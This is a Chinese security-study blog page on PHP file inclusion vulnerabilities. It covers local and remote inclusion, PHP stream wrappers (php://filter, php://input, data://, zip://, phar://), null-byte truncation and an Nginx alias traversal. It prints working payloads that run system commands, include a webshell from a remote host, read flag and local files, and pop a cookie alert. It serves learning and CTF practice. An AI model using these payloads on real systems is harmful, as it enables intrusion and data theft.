@@ -1,0 +1,119 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><meta name="author" content="zhangMini"><title>文件包含 · Mini's blog</title><meta name="description" content="文件包含PHP文件包含函数
+include() 
+当使用该函数包含文件时，只有代码执行到 include()函数时才将文件包含进来，发生错误时会给出一个警告，继续向下执行
+
+
+include_once()
+功能与 Include()相同，区别在于当重复调用同一文件时，程序只调用一次
+
+
+requir"><meta name="keywords" content="Security, life"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="renderer" content="webkit"><link rel="short icon" href="/images/favicon.png" type="image/x-icon"><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="/css/blog_basic.css"><link rel="stylesheet" href="/css/font-awesome.min.css"><link rel="alternate" type="application/atom+xml" title="ATOM 1.0" href="/atom.xml"><meta name="generator" content="Hexo 6.3.0"></head><body><div class="sidebar animated fadeInDown"><div class="logo-title"><div class="title"><img src="/images/logo@2x.png" style="width:127px;"><h3 title=""><a href="/">Mini's blog</a></h3><div class="description"><p>Nothing lasts forever.</p></div></div></div><ul class="social-links"></ul><div class="footer"><a target="_blank" href="/"><span>Theme by </span></a><a target="_blank" rel="noopener" href="https://www.caicai.me"> CaiCai </a><span>&</span><a target="_blank" rel="noopener" href="https://github.com/Ben02/hexo-theme-Anatole"> Ben</a><div class="by_farbox"><a href="https://hexo.io/zh-cn/" target="_blank">Proudly published with Hexo&#65281;</a></div></div></div><div class="main"><div class="page-top animated fadeInDown"><div class="nav"><li><a href="/">首页</a></li><li><a href="/about">关于</a></li><li><a href="/archives">归档</a></li><li><a href="/tags">tags</a></li></div><div class="information"><div class="back_btn"><li><a class="fa fa-chevron-left" onclick="window.history.go(-1)"> </a></li></div><div class="avatar"><img src="/images/favicon.png"></div></div></div><div class="autopagerize_page_element"><div class="content"><div class="post-page"><div class="post animated fadeInDown"><div class="post-title"><h3><a>文件包含</a></h3></div><div class="post-content"><h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><h2 id="PHP文件包含函数"><a href="#PHP文件包含函数" class="headerlink" title="PHP文件包含函数"></a>PHP文件包含函数</h2><ul>
+<li>include() <ul>
+<li>当使用该函数包含文件时，只有代码执行到 include()函数时才将文件包含进来，发生错误时会给出一个警告，继续向下执行</li>
+</ul>
+</li>
+<li>include_once()<ul>
+<li>功能与 Include()相同，区别在于当重复调用同一文件时，程序只调用一次</li>
+</ul>
+</li>
+<li>require()<ul>
+<li>require()与 include()的区别在于require()执行如果发生错误，函数会输出错误信息，并终止脚本的运行</li>
+</ul>
+</li>
+<li>require_once()<ul>
+<li>功能与 require()相同，区别在于当重复调用同一文件时，程序只调用一次</li>
+</ul>
+</li>
+</ul>
+<br>
+
+<h2 id="文件包含成因"><a href="#文件包含成因" class="headerlink" title="文件包含成因"></a>文件包含成因</h2><p>大多数情况下，文件包含函数中包含的代码文件是固定的，因此也不会出现安全问题。 但是，有些时候，文件包含的代码文件被写成了一个变量，且这个变量可以由前端用户传进来，这种情况下，如果没有做足够的安全考虑，则可能会引发文件包含漏洞。 攻击者会指定一个“意想不到”的文件让包含函数去执行，从而造成恶意操作</p>
+<br>
+
+<h2 id="本地包含与远程包含"><a href="#本地包含与远程包含" class="headerlink" title="本地包含与远程包含"></a>本地包含与远程包含</h2><h3 id="本地包含"><a href="#本地包含" class="headerlink" title="本地包含"></a>本地包含</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">allow_url_fopen = On/Off</span><br></pre></td></tr></table></figure>
+<p>示例</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?filename = ../../../1.txt</span><br></pre></td></tr></table></figure>
+
+<br>
+
+<h3 id="远程包含"><a href="#远程包含" class="headerlink" title="远程包含"></a>远程包含</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">allow_url_include = On/Off</span><br></pre></td></tr></table></figure>
+<p>示例</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename = http://192.168.59.1:8080/ws.php</span><br></pre></td></tr></table></figure>
+<br>
+
+<br>
+
+<h2 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">file://     --访问本地文件系统</span><br><span class="line">http://     --访问http(s)网址</span><br><span class="line">ftp://      --访问FTP(s) URLs</span><br><span class="line">php://      --访问各个输入/输出流</span><br><span class="line">zlib://     --压缩流</span><br><span class="line">data://     --数据</span><br><span class="line">phar://     --PHP归档</span><br></pre></td></tr></table></figure>
+
+<h3 id="php-x2F-x2F"><a href="#php-x2F-x2F" class="headerlink" title="php:&#x2F;&#x2F;"></a>php:&#x2F;&#x2F;</h3><h4 id="php-x2F-x2F-filter"><a href="#php-x2F-x2F-filter" class="headerlink" title="php:&#x2F;&#x2F;filter"></a>php:&#x2F;&#x2F;filter</h4><p><em>不受allow_url_fopen以及allow_url_include的影响</em></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file = php://filter/read=convert.base64-encode/resource=flag.php   # 得到base64编码格式的php文件。如果不加read读取链，则会将其中的内容当作PHP代码执行，则无法读取到其中的文件内容，所以要在read读取链中将其编码</span><br></pre></td></tr></table></figure>
+
+<p>在看PHP:&#x2F;&#x2F;filter底层代码分析得时候，看到了一种形式</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/resource=a/convert.base64-decode/…/…/a.txt</span><br></pre></td></tr></table></figure>
+
+<p>目前还只是对它的原理懂一点点。。只能后面遇到了在进一步了解了</p>
+<p>在此贴出出现了上面形式得博客链接</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/HBohan/article/details/121099051">php:&#x2F;&#x2F;filter 的浅略底层分析</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/solitudi/article/details/121206836">[PHP底层]关于php:&#x2F;&#x2F;filter的分析</a></p>
+<br>
+
+<h4 id="php-x2F-x2F-input"><a href="#php-x2F-x2F-input" class="headerlink" title="php:&#x2F;&#x2F;input"></a>php:&#x2F;&#x2F;input</h4><p><em>其只受allow_url_include参数的影响</em><br><em>当enctype&#x3D;”multipart&#x2F;form-data”时候，php:&#x2F;&#x2F;input无效</em></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">test.php?file=php://input</span><br><span class="line"></span><br><span class="line">POST: &lt;?php info();?&gt;     # 将POST输入流当作PHP代码来执行</span><br></pre></td></tr></table></figure>
+
+<br>
+
+<h3 id="file-x2F-x2F"><a href="#file-x2F-x2F" class="headerlink" title="file:&#x2F;&#x2F;"></a>file:&#x2F;&#x2F;</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">test.php?file=file://C:/aa.txt</span><br><span class="line">test.php?file=file:///C://Users/Mini/Desktop/flag.txt       #常用于读取本地文件</span><br></pre></td></tr></table></figure>
+
+<br>
+
+<h3 id="data-x2F-x2F"><a href="#data-x2F-x2F" class="headerlink" title="data:&#x2F;&#x2F;"></a>data:&#x2F;&#x2F;</h3><p>和php:&#x2F;&#x2F;类似，都是用了流的概念，将原本的include的文件流重定向到了用户可控制的输入流中</p>
+<p><em>需要allow_url_include以及allow_url_fopen都开启</em></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?file=data://text/plain,&lt;?php system(&quot;ping 127.0.0.1&quot;)?&gt;        # text/plain的意思是将文件设置为纯文本的形式，浏览器在获取到这种文件时并不会对其进行处理。text/plain后面的值会被当作php代码执行</span><br><span class="line">?file=data://text/plain,&lt;?=system(&#x27;cat fl*&#x27;);?&gt;</span><br><span class="line">?file=data://text/plain,&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span><br><span class="line">?file=data://text/plain,base64,PD9waHAgZWNobyBwaHBpbmZvKCk7Pz4=     #如果对特殊字符进行过滤，可以将代码进行base64编码后再输入</span><br></pre></td></tr></table></figure>
+
+<br>
+
+<h3 id="zip-x2F-x2F-与-phar-x2F-x2F-协议"><a href="#zip-x2F-x2F-与-phar-x2F-x2F-协议" class="headerlink" title="zip:&#x2F;&#x2F; 与 phar:&#x2F;&#x2F;协议"></a>zip:&#x2F;&#x2F; 与 phar:&#x2F;&#x2F;协议</h3><p><em>不受allow_url_fopen以及allow_url_include参数的影响</em></p>
+<p>倘若有一种情况限制文件后缀为php的文件，并且上传的文件只能是jpg格式</p>
+<p>比较旧的版本可以使用00截断、路径长度阶段登。但是若没有截断漏洞时</p>
+<p>可以尝试使用zip伪协议，将木马放在压缩包中，再将压缩包后缀修改为上传白名单，然后使用zip协议进行包含</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">?file=zip://C:\phpStudt\PHPTutorial\WWW\cc.jpg%23cc</span><br><span class="line"># zip://绝对路径\需要解压缩的文件%23子文件名</span><br><span class="line"></span><br><span class="line">?file=phar://cc.jpg/cc.php</span><br><span class="line"># 同zip协议，但是phar协议为相对路径，zip协议为绝对路径</span><br><span class="line"># phar://压缩包名/内部文件名，如写一个一句话木马cc.php，然后用zip协议压缩为cc.zip，再将后缀改为cc.jpg</span><br></pre></td></tr></table></figure>
+
+<br>
+
+<h3 id="http-x2F-x2F-访问http或https的网址"><a href="#http-x2F-x2F-访问http或https的网址" class="headerlink" title="http:&#x2F;&#x2F; 访问http或https的网址"></a>http:&#x2F;&#x2F; 访问http或https的网址</h3><p><em>allow_url_fopen与allow_url_include需要同时开启</em></p>
+<p>此伪协议就是远程文件包含漏洞。可通过其他主机getshell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=http://localhost/1.php</span><br></pre></td></tr></table></figure>
+
+<h2 id="Others"><a href="#Others" class="headerlink" title="Others"></a>Others</h2><h3 id="限制后缀"><a href="#限制后缀" class="headerlink" title="限制后缀"></a>限制后缀</h3><p>有一些开发者会限制文件的后缀，如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $file = $_GET[&#x27;file&#x27;] . &#x27;.php&#x27;;</span><br><span class="line">    echo $file;</span><br><span class="line">    include($file);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>在下面条件时，可以使用%00截断</p>
+<ul>
+<li>PHP版本&lt;5.3(不包括5.3)</li>
+<li>PHP magic_quotes_gpc &#x3D; off;</li>
+<li>PHP对所接收的参数，如上述代码中的$_GET[‘file’]未使用addslashes函数</li>
+</ul>
+<p>那么我们使用00截断,就可以访问其他文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=flag.txt%00</span><br></pre></td></tr></table></figure>
+<p>如果magic_quotes_gpc &#x3D; On 或者 使用addslashes函数，那么情况便会变为下面</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?file=hello.txt%00</span><br><span class="line"></span><br><span class="line"># 结果为</span><br><span class="line">hello.txt\0.php</span><br></pre></td></tr></table></figure>
+
+<br>
+
+<h3 id="file-get-contents函数——例题"><a href="#file-get-contents函数——例题" class="headerlink" title="file_get_contents函数——例题"></a>file_get_contents函数——例题</h3><ul>
+<li>该函数是用于把文件的内容读入到一个字符串中</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$data</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>];</span><br><span class="line">    <span class="variable">$a</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$data</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;data&quot;</span>.<span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$a</span>===<span class="string">&quot;xxx&quot;</span>)</span><br><span class="line">    &#123;<span class="keyword">echo</span> <span class="string">&quot;return is true&quot;</span>;&#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;<span class="keyword">echo</span> <span class="string">&quot;return is false&quot;</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>file_get_contents(“php:&#x2F;&#x2F;input”)能够获取到原始请求的数据流，在提交后用burp抓包，post提交xxx后成功</p>
+<p>除此之外，还有一些php伪协议也可以被file_get_contents函数执行，如：</p>
+<ul>
+<li>php:&#x2F;&#x2F;stdout,php:&#x2F;&#x2F;stdin,php:&#x2F;&#x2F;stderr等</li>
+</ul>
+<h3 id="目录穿越"><a href="#目录穿越" class="headerlink" title="目录穿越"></a>目录穿越</h3><p>Nginx错误配置</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Location /static&#123;               # location /Purl 为普通匹配，Purl和用户请求url的开头相同就匹配成功。如请求是www.mysite.com/static/img/1.jpg</span><br><span class="line">    Alias /home/myapp/static/;  # alias指令是在其定义的目录下查找文件</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>如果配置文件包含上述内容，很可能是运维人员或开发人员想让用户访问static目录(一般是静态资源目录)</p>
+<p>如果用户请求的web路径是&#x2F;static…&#x2F;，拼接到alias上就变成了&#x2F;home&#x2F;myapp&#x2F;static&#x2F;…&#x2F;，此时便会产生目录穿越漏洞，并且穿越到myapp目录</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.139.128:8081/files../</span><br></pre></td></tr></table></figure>
+<p><a target="_blank" rel="noopener" href="http://t.zoukankan.com/yu2006070-01-p-10212646.html">Nginx配置文件中Location详解</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_46407419/article/details/124855355">Linux Nginx的Location详解</a></p>
+</div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2022-10-08</span><i class="fa fa-tag"></i><a class="tag" href="/tags/web/" title="web">web </a></div></div></div></div><div class="share"><div class="evernote"><a class="fa fa-bookmark" href="javascript:(function(){EN_CLIP_HOST='http://www.evernote.com';try{var%20x=document.createElement('SCRIPT');x.type='text/javascript';x.src=EN_CLIP_HOST+'/public/bookmarkClipper.js?'+(new%20Date().getTime()/100000);document.getElementsByTagName('head')[0].appendChild(x);}catch(e){location.href=EN_CLIP_HOST+'/clip.action?url='+encodeURIComponent(location.href)+'&amp;title='+encodeURIComponent(document.title);}})();" ref="nofollow" target="_blank"></a></div><div class="weibo"><a class="fa fa-weibo" href="javascript:void((function(s,d,e){try{}catch(e){}var f='http://service.weibo.com/share/share.php?',u=d.location.href,p=['url=',e(u),'&amp;title=',e(d.title),'&amp;appkey=2924220432'].join('');function a(){if(!window.open([f,p].join(''),'mb',['toolbar=0,status=0,resizable=1,width=620,height=450,left=',(s.width-620)/2,',top=',(s.height-450)/2].join('')))u.href=[f,p].join('');};if(/Firefox/.test(navigator.userAgent)){setTimeout(a,0)}else{a()}})(screen,document,encodeURIComponent));"></a></div><div class="twitter"><a class="fa fa-twitter" target="_blank" rel="noopener" href="http://twitter.com/home?status=,http://example.com/2022/10/08/文件包含/,Mini's blog,文件包含,;"></a></div></div><div class="pagination"><ul class="clearfix"><li class="pre pagbuttons"><a class="btn" role="navigation" href="/2022/10/18/SSRF/" title="SSRF">上一篇</a></li></ul></div></div></div></div></div><script src="/js/jquery.js"></script><script src="/js/jquery-migrate-1.2.1.min.js"></script><script src="/js/jquery.appear.js"></script></body></html>
